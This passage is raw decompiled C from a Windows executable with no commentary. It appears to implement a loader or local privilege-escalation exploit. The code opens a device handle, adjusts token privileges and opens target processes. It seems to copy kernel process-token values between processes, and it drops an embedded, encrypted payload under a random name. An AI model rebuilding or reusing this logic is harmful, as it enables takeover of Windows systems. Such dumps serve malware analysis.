                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0xc;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004e89;
                                                    pCVar44 = (LPCSTR)FUN_14000ae64((longlong)
                                                                                    (&
                                                  stack0x00000030 + lVar20),0x1400198fb,uVar32);
                                                  *(undefined8 *)(&stack0xfffffffffffffff0 + lVar20)
                                                       = 0;
                                                  *(undefined4 *)(&stack0xffffffffffffffe8 + lVar20)
                                                       = 0;
                                                  *(undefined4 *)(&stack0xffffffffffffffe0 + lVar20)
                                                       = 3;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004eaf;
                                                  DAT_140034030 =
                                                       CreateFileA(pCVar44,0xc0000000,0,
                                                                   (LPSECURITY_ATTRIBUTES)0x0,
                                                                   *(DWORD *)(&
                                                  stack0xffffffffffffffe0 + lVar20),
                                                  *(DWORD *)(&stack0xffffffffffffffe8 + lVar20),
                                                  *(HANDLE *)(&stack0xfffffffffffffff0 + lVar20));
                                                  if (DAT_140034030 != (HANDLE)0xffffffffffffffff) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004ec5;
                                                    lVar33 = FUN_140007a1f();
                                                    if (lVar33 != 0) {
                                                      ppvVar1 = (PVOID *)(&stack0x00004b30 + lVar20)
                                                      ;
                                                      *ppvVar1 = (PVOID)0x0;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004ee4;
                                                      Wow64DisableWow64FsRedirection(ppvVar1);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0xc;
                                                      uVar32 = *(ulonglong *)
                                                                ((longlong)&uStack_48 + lVar20);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004efb;
                                                      pCVar44 = (LPCSTR)FUN_14000ae64((longlong)
                                                                                      (&
                                                  stack0x00004460 + lVar20),0x1400198d9,uVar32);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 1
                                                  ;
                                                  uVar43 = *(undefined8 *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004f09;
                                                  pHVar45 = LoadLibraryExA(pCVar44,(HANDLE)0x0,
                                                                           (DWORD)uVar43);
                                                  if (*ppvVar1 != (PVOID)0x0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004f19;
                                                    Wow64RevertWow64FsRedirection(*ppvVar1);
                                                  }
                                                  if (pHVar45 != (HMODULE)0x0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x16;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004f36;
                                                    pCVar44 = (LPCSTR)FUN_14000ae64((longlong)
                                                                                    (&
                                                  stack0x00000030 + lVar20),0x1400198e5,uVar32);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004f41;
                                                  pFVar46 = GetProcAddress(pHVar45,pCVar44);
                                                  if (pFVar46 == (FARPROC)0x0) {
                                                    lVar33 = 0;
                                                  }
                                                  else {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004f54;
                                                    lVar33 = FUN_140007dd5(pFVar46 + (lVar33 - (
                                                  longlong)pHVar45));
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004f63;
                                                  FreeLibrary(pHVar45);
                                                  if (lVar33 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004f7f;
                                                    iVar29 = FUN_140007f48(*(longlong *)
                                                                            (&stack0x00004ce0 +
                                                                            lVar20),*(longlong *)
                                                                                     (&
                                                  stack0x00004cd0 + lVar20));
                                                  if (iVar29 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004f94;
                                                    lVar55 = FUN_140007e5d(lVar33,iVar29);
                                                    if (lVar55 != 0) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004faf;
                                                      FUN_140007ec6(DAT_140034208 + lVar55);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004fbe;
                                                      FUN_140007ec6(DAT_1400341f8 + lVar55);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140004fcd;
                                                      FUN_140007ec6(DAT_140034200 + lVar55);
                                                      if (((&stack0x00004d1f)[lVar20] & 1) != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140004fe9;
                                                        iVar31 = FUN_140007f48(*(longlong *)
                                                                                (&stack0x00004c70 +
                                                                                lVar20),*(longlong *
                                                                                         )(&
                                                  stack0x00004c78 + lVar20));
                                                  if (iVar31 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004ff7;
                                                    lVar57 = FUN_140007e5d(lVar33,iVar31);
                                                    if (lVar57 != 0) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x14000500b;
                                                      uVar43 = FUN_140007dd5(lVar57 + _DAT_1400341f0
                                                                            );
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x14000501d;
                                                      FUN_140007ce2(lVar55 + _DAT_1400341f0,uVar43);
                                                    }
                                                  }
                                                  }
                                                  if (((&stack0x00004d1e)[lVar20] & 1) != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x14000502f;
                                                    DVar26 = GetCurrentProcessId();
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005039;
                                                    lVar55 = FUN_140007e5d(lVar33,DVar26);
                                                    if (lVar55 != 0) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140005050;
                                                      uVar43 = FUN_140007dd5(lVar33 + _DAT_1400341f0
                                                                            );
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x140005062;
                                                      FUN_140007ce2(lVar55 + _DAT_1400341f0,uVar43);
                                                    }
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         9;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005079;
                                                    pCVar44 = (LPCSTR)FUN_14000ae64((longlong)
                                                                                    (&
                                                  stack0x000047f0 + lVar20),0x1400198b0,uVar32);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x10;
                                                  uVar32 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140005093;
                                                  lpProcName = (LPCSTR)FUN_14000ae64((longlong)
                                                                                     (&
                                                  stack0x00004460 + lVar20),0x1400198b9,uVar32);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000509e;
                                                  pHVar45 = GetModuleHandleA(pCVar44);
                                                  if (pHVar45 != (HMODULE)0x0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400050b2;
                                                    pFVar46 = GetProcAddress(pHVar45,lpProcName);
                                                    pcVar24 = DAT_1400342b8;
                                                    if (pFVar46 != (FARPROC)0x0) {
                                                      *(undefined8 *)(&stack0x000041e0 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)(&stack0x00004660 + lVar20) = 0
                                                      ;
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x1400050dd;
                                                      pvVar35 = GetCurrentProcess();
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x28;
                                                      uVar43 = *(undefined8 *)
                                                                ((longlong)&uStack_48 + lVar20);
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x1400050e9;
                                                      iVar31 = (*pcVar24)(pvVar35,uVar43,
                                                                          &stack0x000041e0 + lVar20)
                                                      ;
                                                      if (iVar31 != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 0x10;
                                                        uVar32 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140005101;
                                                        uVar43 = FUN_14000ae64((longlong)
                                                                               (&stack0x00000030 +
                                                                               lVar20),0x1400198c9,
                                                                               uVar32);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140005113;
                                                        iVar31 = (*DAT_1400342c8)(0,uVar43,&
                                                  stack0x00004660 + lVar20);
                                                  if (iVar31 != 0) {
                                                    *(undefined4 *)(&stack0x00004b30 + lVar20) = 1;
                                                    *(undefined8 *)(&stack0x00004b34 + lVar20) =
                                                         *(undefined8 *)(&stack0x00004660 + lVar20);
                                                    *(undefined4 *)(&stack0x00004b3c + lVar20) = 2;
                                                    *(undefined8 *)
                                                     (&stack0xffffffffffffffe0 + lVar20) = 0;
                                                    *(undefined8 *)
                                                     (&stack0xffffffffffffffe8 + lVar20) = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x10;
                                                    uVar43 = *(undefined8 *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005153;
                                                    (*DAT_1400342d0)(*(undefined8 *)
                                                                      (&stack0x000041e0 + lVar20),0,
                                                                     &stack0x00004b30 + lVar20,
                                                                     uVar43);
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000515f;
                                                  CloseHandle(*(HANDLE *)(&stack0x000041e0 + lVar20)
                                                             );
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000516f;
                                                  pvVar35 = (HANDLE)(*DAT_140034328)(0x800,0,iVar29)
                                                  ;
                                                  if (pvVar35 == (HANDLE)0x0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005184;
                                                    pvVar35 = (HANDLE)(*DAT_140034328)(0x1fffff,0,
                                                                                       iVar29);
                                                    if (pvVar35 == (HANDLE)0x0) goto LAB_140005199;
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140005191;
                                                  (*pFVar46)(pvVar35);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140005199;
                                                  CloseHandle(pvVar35);
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
LAB_140005199:
                                                  if (DAT_140034210 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400051ac;
                                                    lVar33 = FUN_140007a1f();
                                                    *(undefined4 *)(&stack0x00004b30 + lVar20) = 0;
                                                    puVar60 = &stack0x00000030 + lVar20;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400051cc;
                                                    iVar29 = (*DAT_1400342d8)();
                                                    if (iVar29 != 0) {
                                                      uVar37 = (ulonglong)
                                                               (*(uint *)(&stack0x00004b30 + lVar20)
                                                               >> 3);
                                                      puVar47 = &stack0x00000038 + lVar20;
                                                      uVar32 = 0;
                                                      while (uVar32 != uVar37) {
                                                        puVar56 = puVar47;
                                                        for (uVar53 = uVar32 + 1; uVar53 != uVar37;
                                                            uVar53 = uVar53 + 1) {
                                                          if (*(ulonglong *)
                                                               (&stack0x00000030 +
                                                               uVar53 * 8 + lVar20) <
                                                              *(ulonglong *)
                                                               (&stack0x00000030 +
                                                               uVar32 * 8 + lVar20)) {
                                                            for (lVar55 = 0; lVar55 != 8;
                                                                lVar55 = lVar55 + 1) {
                                                              uVar10 = puVar60[lVar55];
                                                              puVar60[lVar55] = puVar56[lVar55];
                                                              puVar56[lVar55] = uVar10;
                                                            }
                                                          }
                                                          puVar56 = puVar56 + 8;
                                                        }
                                                        puVar47 = puVar47 + 8;
                                                        puVar60 = puVar60 + 8;
                                                        uVar32 = uVar32 + 1;
                                                      }
                                                      if (DAT_140034210 != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140005252;
                                                        FUN_140007c3c(lVar33,DAT_140034210,
                                                                      (longlong)
                                                                      (&stack0x00000030 + lVar20),
                                                                      uVar37);
                                                      }
                                                      if (DAT_140034218 != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x14000526d;
                                                        FUN_140007c3c(lVar33,DAT_140034218,
                                                                      (longlong)
                                                                      (&stack0x00000030 + lVar20),
                                                                      uVar37);
                                                      }
                                                      if (DAT_140034220 != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x140005288;
                                                        FUN_140007c3c(lVar33,DAT_140034220,
                                                                      (longlong)
                                                                      (&stack0x00000030 + lVar20),
                                                                      uVar37);
                                                      }
                                                      if (DAT_140034230 != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x1400052a3;
                                                        FUN_140007a64(lVar33,DAT_140034230,
                                                                      (longlong)
                                                                      (&stack0x00000030 + lVar20),
                                                                      uVar37);
                                                      }
                                                      if (DAT_140034238 != 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x1400052be;
                                                        FUN_140007a64(lVar33,DAT_140034238,
                                                                      (longlong)
                                                                      (&stack0x00000030 + lVar20),
                                                                      uVar37);
                                                      }
                                                      if (DAT_140034228 != 0) {
                                                        lVar33 = DAT_140034228 + lVar33;
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x1400052d9;
                                                        lVar55 = FUN_140007dd5(lVar33);
                                                        if (lVar55 != 0 && lVar55 != lVar33) {
                                                          bVar48 = 0;
                                                          for (; (lVar55 != lVar33 && (lVar55 != 0))
                                                              ; lVar55 = FUN_140007dd5(lVar55)) {
                                                            *(undefined8 *)
                                                             ((longlong)&uStack_48 + lVar20) =
                                                                 0x140005311;
                                                            uVar32 = FUN_140007dd5(lVar55 + 0x28);
                                                            if (uVar32 != 0) {
                                                              *(undefined8 *)
                                                               ((longlong)&uStack_48 + lVar20) =
                                                                   0x140005327;
                                                              puVar60 = &stack0x00000030 + lVar20;
                                                              bVar61 = FUN_140007bea(uVar32,(
                                                  longlong)(&stack0x00000030 + lVar20),uVar37,
                                                  &stack0x00004460 + lVar20);
                                                  if (bVar61) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005333;
                                                    lVar57 = FUN_140007ba7((longlong)
                                                                           (&stack0x00004460 +
                                                                           lVar20));
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x14000533b;
                                                    bVar61 = FUN_140007b3d(lVar57,(longlong)puVar60)
                                                    ;
                                                    bVar48 = bVar48 | bVar61;
                                                  }
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140005346;
                                                  }
                                                  if (bVar48 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140005360;
                                                    FUN_140007ce2(lVar33,lVar33);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x14000536c;
                                                    FUN_140007ce2(lVar33 + 8,lVar33);
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
                                                  }
                                                  goto LAB_140002cad;
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003faf;
                                                  FUN_14000726e();
                                                  pcVar24 = DAT_140034078;
                                                  *(undefined8 *)(&stack0x000042e8 + lVar20) = 0;
                                                  *(undefined8 *)(&stack0x00004660 + lVar20) = 0;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003fce;
                                                  pvVar35 = GetCurrentProcess();
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x28;
                                                  uVar43 = *(undefined8 *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140003fd9;
                                                  iVar29 = (*pcVar24)(pvVar35,uVar43,
                                                                      &stack0x000042e8 + lVar20);
                                                  if (iVar29 != 0) {
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x15;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140003ff4;
                                                    uVar43 = FUN_1400056d3((longlong)
                                                                           (&stack0x00004b30 +
                                                                           lVar20),0x140019907,
                                                                           uVar32);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004006;
                                                    iVar29 = (*DAT_140034080)(0,uVar43,&
                                                  stack0x00004660 + lVar20);
                                                  if (iVar29 != 0) {
                                                    *(undefined4 *)(&stack0x000047f0 + lVar20) = 1;
                                                    *(undefined8 *)(&stack0x000047f4 + lVar20) =
                                                         *(undefined8 *)(&stack0x00004660 + lVar20);
                                                    *(undefined4 *)(&stack0x000047fc + lVar20) = 2;
                                                    *(undefined8 *)
                                                     (&stack0xffffffffffffffe0 + lVar20) = 0;
                                                    *(undefined8 *)
                                                     (&stack0xffffffffffffffe8 + lVar20) = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x10;
                                                    uVar43 = *(undefined8 *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004046;
                                                    (*DAT_140034088)(*(undefined8 *)
                                                                      (&stack0x000042e8 + lVar20),0,
                                                                     &stack0x000047f0 + lVar20,
                                                                     uVar43);
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004052;
                                                  CloseHandle(*(HANDLE *)(&stack0x000042e8 + lVar20)
                                                             );
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x140004057;
                                                  uVar32 = FUN_140007240();
                                                  uVar32 = uVar32 * 0x5851f42d4c957f2d +
                                                           0x14057b7ef767814f;
                                                  puVar4 = (ulonglong *)(&stack0x00004b10 + lVar20);
                                                  *puVar4 = uVar32;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 7
                                                  ;
                                                  uVar32 = uVar32 % *(ulonglong *)
                                                                     ((longlong)&uStack_48 + lVar20)
                                                  ;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400040a0;
                                                  FUN_1400071aa(puVar4,0x140034aa4,uVar32 + 6);
                                                  (&DAT_140034aaa)[uVar32] = 0;
                                                  uVar37 = *puVar4 * 0x5851f42d4c957f2d +
                                                           0x14057b7ef767814f;
                                                  *puVar4 = uVar37;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 5
                                                  ;
                                                  uVar37 = uVar37 % *(ulonglong *)
                                                                     ((longlong)&uStack_48 + lVar20)
                                                  ;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400040da;
                                                  FUN_1400071aa(puVar4,(longlong)puVar60,uVar37 | 8)
                                                  ;
                                                  puVar50 = &DAT_14001991c;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) = 4
                                                  ;
                                                  uVar32 = *(ulonglong *)
                                                            ((longlong)&uStack_48 + lVar20);
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x1400040f1;
                                                  lVar33 = FUN_1400056d3(0x1400348a0,0x14001991c,
                                                                         uVar32);
                                                  for (puVar59 = (undefined *)0x0;
                                                      puVar50 != puVar59; puVar59 = puVar59 + 1) {
                                                    (puVar60 + uVar37 + 8)[(longlong)puVar59] =
                                                         puVar59[lVar33];
                                                  }
                                                  (&stack0x00004778)
                                                  [(longlong)(puVar50 + uVar37 + lVar20)] = 0;
                                                  uVar32 = *(longlong *)(&stack0x00004b10 + lVar20)
                                                           * 0x5851f42d4c957f2d + 0x14057b7ef767814f
                                                  ;
                                                  *(ulonglong *)(&stack0x00004b10 + lVar20) = uVar32
                                                  ;
                                                  uVar32 = uVar32 % uVar53;
                                                  if (uVar32 == 0) {
                                                    puVar59 = (undefined *)0x104;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400047be;
                                                    GetWindowsDirectoryA
                                                              (&stack0x00004460 + lVar20,0x104);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400047c6;
                                                    lVar33 = FUN_1400071fd((longlong)
                                                                           (&stack0x00004460 +
                                                                           lVar20));
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400047d8;
                                                    puVar50 = puVar59;
                                                    lVar55 = FUN_140007110((longlong)
                                                                           (&stack0x00004770 +
                                                                           lVar20));
                                                    *(undefined ***)(&stack0x00004b30 + lVar20) =
                                                         &PTR_FUN_140017348;
                                                    *(undefined **)(&stack0x00004b38 + lVar20) =
                                                         &DAT_1400349a0;
                                                    *(undefined8 *)(&stack0x00004b40 + lVar20) =
                                                         0x104;
                                                    *(undefined8 *)(&stack0x00004b48 + lVar20) = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004819;
                                                    sVar25 = FUN_1400055ea((undefined8 *)
                                                                           (&stack0x00004b30 +
                                                                           lVar20),lVar33,
                                                                           (ulonglong)puVar59,
                                                                           0x140017320);
                                                    if (sVar25 != 0) goto LAB_140002cad;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         6;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004839;
                                                    sVar25 = FUN_14000541c((undefined8 *)
                                                                           (&stack0x00004b30 +
                                                                           lVar20),0x14002d73c,
                                                                           uVar32);
LAB_1400048a5:
                                                    if (sVar25 == 0) {
                                                      *(undefined8 *)((longlong)&uStack_48 + lVar20)
                                                           = 0x1400048c7;
                                                      sVar25 = FUN_1400055ea((undefined8 *)
                                                                             (&stack0x00004b30 +
                                                                             lVar20),lVar55,
                                                                             (ulonglong)puVar50,
                                                                             0x140017320);
                                                      if (sVar25 == 0) {
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) = 1;
                                                        uVar32 = *(ulonglong *)
                                                                  ((longlong)&uStack_48 + lVar20);
                                                        *(undefined8 *)
                                                         ((longlong)&uStack_48 + lVar20) =
                                                             0x1400048e7;
                                                        sVar25 = FUN_14000541c((undefined8 *)
                                                                               (&stack0x00004b30 +
                                                                               lVar20),0x1400194e0,
                                                                               uVar32);
                                                        if (sVar25 == 0) goto LAB_1400048f0;
                                                      }
                                                    }
                                                    goto LAB_140002cad;
                                                  }
                                                  if (uVar32 != 1) {
                                                    puVar59 = &DAT_140019920;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x10;
                                                    uVar32 = *(ulonglong *)
                                                              ((longlong)&uStack_48 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004852;
                                                    lVar33 = FUN_1400056d3(0x1400348a0,0x140019920,
                                                                           uVar32);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004864;
                                                    puVar50 = puVar59;
                                                    lVar55 = FUN_140007110((longlong)
                                                                           (&stack0x00004770 +
                                                                           lVar20));
                                                    *(undefined ***)(&stack0x00004b30 + lVar20) =
                                                         &PTR_FUN_140017348;
                                                    *(undefined **)(&stack0x00004b38 + lVar20) =
                                                         &DAT_1400349a0;
                                                    *(undefined8 *)(&stack0x00004b40 + lVar20) =
                                                         0x104;
                                                    *(undefined8 *)(&stack0x00004b48 + lVar20) = 0;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400048a5;
                                                    sVar25 = FUN_1400055ea((undefined8 *)
                                                                           (&stack0x00004b30 +
                                                                           lVar20),lVar33,
                                                                           (ulonglong)puVar59,
                                                                           0x140017320);
                                                    goto LAB_1400048a5;
                                                  }
                                                  pCVar38 = &stack0x00000030 + lVar20;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000474b;
                                                  DVar26 = GetTempPathA(0x104,pCVar38);
                                                  if (DVar26 == 0) goto LAB_140002cad;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000475c;
                                                  lVar33 = FUN_1400071fd((longlong)
                                                                         (&stack0x00000030 + lVar20)
                                                                        );
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000476e;
                                                  pCVar51 = pCVar38;
                                                  lVar55 = FUN_140007110((longlong)
                                                                         (&stack0x00004770 + lVar20)
                                                                        );
                                                  *(longlong *)(&stack0x000041e0 + lVar20) = lVar33;
                                                  *(LPSTR *)(&stack0x000041e8 + lVar20) = pCVar38;
                                                  *(longlong *)(&stack0x000041f0 + lVar20) = lVar55;
                                                  *(LPSTR *)(&stack0x000041f8 + lVar20) = pCVar51;
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000479a;
                                                  FUN_140006959((undefined8 *)
                                                                (&stack0x00004140 + lVar20),
                                                                &DAT_1400349a0,
                                                                (longlong *)
                                                                (&stack0x000041e0 + lVar20));
                                                  if (*(short *)(&stack0x00004150 + lVar20) != 0)
                                                  goto LAB_140002cad;
LAB_1400048f0:
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000490c;
                                                  FUN_140007051((longlong *)
                                                                (&stack0x00004900 + lVar20),
                                                                (undefined8 *)&DAT_1400172b0,0x13a98
                                                               );
                                                  if (*(short *)(&stack0x00004910 + lVar20) != 0)
                                                  goto LAB_140004bd0;
                                                  lVar33 = *(longlong *)(&stack0x00004900 + lVar20);
                                                  *(undefined8 *)(&stack0x00004d30 + lVar20) =
                                                       *(undefined8 *)(&stack0x00004908 + lVar20);
                                                  lVar57 = 0;
                                                  for (lVar55 = 0; lVar55 != 0x100;
                                                      lVar55 = lVar55 + 0x10) {
                                                    lVar40 = *(longlong *)
                                                              ((longlong)&PTR_DAT_14002d5f0 + lVar55
                                                              );
                                                    lVar19 = *(longlong *)
                                                              ((longlong)&DAT_14002d5f8 + lVar55);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004956;
                                                    FUN_14000d5a5(lVar33 + lVar57,lVar40,lVar19);
                                                    lVar57 = lVar57 + lVar19;
                                                  }
                                                  *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                       0x14000497d;
                                                  FUN_140007051((longlong *)
                                                                (&stack0x000042e8 + lVar20),
                                                                (undefined8 *)&DAT_1400172b0,0x13a98
                                                               );
                                                  if (*(short *)(&stack0x000042f8 + lVar20) == 0) {
                                                    *(undefined8 *)(&stack0x00004d10 + lVar20) =
                                                         *(undefined8 *)(&stack0x000042e8 + lVar20);
                                                    puVar5 = (uint *)(&stack0x00004b30 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400049ac;
                                                    FUN_140006155(puVar5,(uint *)&DAT_14002d70c);
                                                    puVar4 = (ulonglong *)
                                                             (&stack0x00004a80 + lVar20);
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400049c5;
                                                    FUN_1400058a8(puVar5,puVar4,
                                                                  (uint *)&DAT_14002d72c);
                                                    puVar6 = (uint *)(&stack0x00004c50 + lVar20);
                                                    puVar6[0] = 0x67ddeb4;
                                                    puVar6[1] = 0x24e8fe52;
                                                    *(undefined8 *)(&stack0x00004c58 + lVar20) =
                                                         0x100000042e38cf5;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x1400049f6;
                                                    FUN_1400058a8(puVar5,(undefined8 *)
                                                                         (&stack0x00004ce8 + lVar20)
                                                                  ,puVar6);
                                                    uVar32 = *(ulonglong *)
                                                              (&stack0x00004a88 + lVar20);
                                                    uVar37 = *puVar4;
                                                    uVar53 = uVar37 >> 0x38 |
                                                             (uVar37 & 0xff000000000000) >> 0x28 |
                                                             (uVar37 & 0xff0000000000) >> 0x18 |
                                                             (uVar37 & 0xff00000000) >> 8 |
                                                             (uVar37 & 0xff000000) << 8 |
                                                             (uVar37 & 0xff0000) << 0x18 |
                                                             (uVar37 & 0xff00) << 0x28 |
                                                             uVar37 << 0x38;
                                                    uVar37 = (longlong)uVar53 >> 0x3f;
                                                    uVar53 = (uVar53 << 1 | (uVar32 & 0xff) >> 7) ^
                                                             uVar37 & 0xc200000000000000;
                                                    lVar55 = (uVar32 >> 0x38 |
                                                              (uVar32 & 0xff000000000000) >> 0x28 |
                                                              (uVar32 & 0xff0000000000) >> 0x18 |
                                                              (uVar32 & 0xff00000000) >> 8 |
                                                              (uVar32 & 0xff000000) << 8 |
                                                              (uVar32 & 0xff0000) << 0x18 |
                                                              (uVar32 & 0xff00) << 0x28 |
                                                             uVar32 << 0x38) * 2 - uVar37;
                                                    *(undefined8 *)((longlong)&uStack_48 + lVar20) =
                                                         0x140004a36;
                                                    uVar32 = uVar53;
                                                    uVar37 = FUN_14000907a(lVar55,uVar53,lVar55,
                                                                           uVar53);
                                                    puVar7 = (ulonglong *)
                                                             (&stack0x000047f0 + lVar20);
